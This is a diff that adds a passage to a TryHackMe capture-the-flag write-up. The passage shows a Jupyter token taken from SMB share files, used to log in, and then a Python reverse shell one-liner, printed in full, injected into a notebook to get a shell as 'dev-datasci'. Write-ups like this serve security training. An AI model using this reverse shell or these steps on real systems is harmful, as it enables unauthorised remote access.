@@ -139,8 +139,32 @@ smb: \> mget * #to download everything from current file path.
 ```
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/37532ed1-c2f3-48cb-a847-54743fdcfe28)
 
+After downloading all the files, I went through them & found a Jupyter-token inside one of the file.
 
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/2af6f790-3a09-4a3f-926d-f87e2cd0ef65)
 
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
+## Initial access:
+
+From the port scan results I was already aware that port 8888 is running the tornado server & hosting Jupyter notebook in it, so I went to the server & found an option to login using jupyter token:
+
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/b5e2db75-db1b-4584-ac65-29562b8e43ee)
+
+I used the Jupyer token which I found during my SMB scan to login into the server & I logged in successfully:
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/485629a3-b49a-4645-b962-2500e3af6e86)
+
+After logging in I found the same files which I observed when I enumerated through the "**datasci-team**" share. Then I opened of of the Machine learning file "weasel.ipynb" & went through it's content:
+
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/316183bd-3700-45f2-b293-3780eebd377b)
+
+I found that there are modules running inside the file & we can also our own module which will be executed by Python, so I used one of the Python reverse shell one-liner & added to the file.
+
+```python
+import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
+```
+
+After running the above code I quickly got the shell back to my netcat listener as a "dev-datasci" user.(pwn3d!🙂)
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/b034c290-d9a1-4403-a173-c1b317f3abcc)
 
 
